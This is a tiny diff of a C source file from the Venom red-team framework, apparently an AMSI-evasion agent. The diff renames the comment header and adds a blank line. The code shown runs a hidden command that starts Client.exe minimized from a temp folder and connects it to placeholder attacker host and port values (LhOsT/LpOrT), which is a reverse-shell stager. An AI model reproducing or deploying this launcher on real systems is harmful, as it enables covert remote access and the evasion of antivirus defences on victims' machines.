@@ -1,6 +1,6 @@
 /*
 Author: r00t-3xp10it (SSA RedTeam @2020)
-Framework: Venom v1.0.17.4 - Amsi Evasion - Agent nº5
+Framework: Venom v1.0.17.4 - shinigami
 */
 
 #include<stdio.h>
@@ -19,3 +19,4 @@ int main()
    _("cd TempDir && cmd.exe /R start /min Client.exe ip=LhOsT port=LpOrT");
    return 0;
 }
+
